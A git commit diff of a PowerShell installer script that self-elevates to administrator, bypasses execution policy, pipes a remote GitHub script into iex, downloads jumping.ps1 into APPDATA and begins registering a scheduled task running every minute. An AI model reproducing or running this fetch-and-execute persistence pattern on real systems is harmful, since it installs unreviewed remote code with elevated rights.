7b0f82d0cb66784853b728700d32365a1fe78498
seypopichun <seypopa@mail.ru>
2026-05-02 00:43:14 +0300

    Update init.ps1

--- init.ps1
+++ init.ps1
@@ -1,18 +1,29 @@
+# init.ps1 – ONE-TIME installer
 
-# ── Settings ────────────────────────────────────────────────────────────────
+# ── Admin ───────────────────────────────────────────────
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    $initUrl = "https://raw.githubusercontent.com/seypopichun/flip/refs/heads/main/init.ps1"
+    $urlToPass = if ($rawUrl) { $rawUrl } else { "" }
+    Start-Process powershell -Verb RunAs `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$rawUrl='$urlToPass'; irm '$initUrl' | iex }`""
+    exit
+}
+# ─────────────────────────────────────────────────────────────────────────────
 
+# ──  Settings ────────────────────────────────────────────────────────────────
 if ([string]::IsNullOrEmpty($rawUrl)) {
     $rawUrl = "https://raw.githubusercontent.com/seypopichun/flip/refs/heads/main/jumping.ps1"
 }
-$destination = "$env:TEMP\jumping.ps1"   
+$destination = "$env:APPDATA\jumping.ps1"  
 $taskName = "AutoJumping"
 $intervalMinutes = 1
 # ─────────────────────────────────────────────────────────────────────────────
 
-
 Write-Host "Downloading jumping.ps1..."
 Invoke-WebRequest -Uri $rawUrl -OutFile $destination -UseBasicParsing
 Write-Host "Saved: $destination"
+
 
 $action = New-ScheduledTaskAction `
     -Execute  "powershell.exe" `
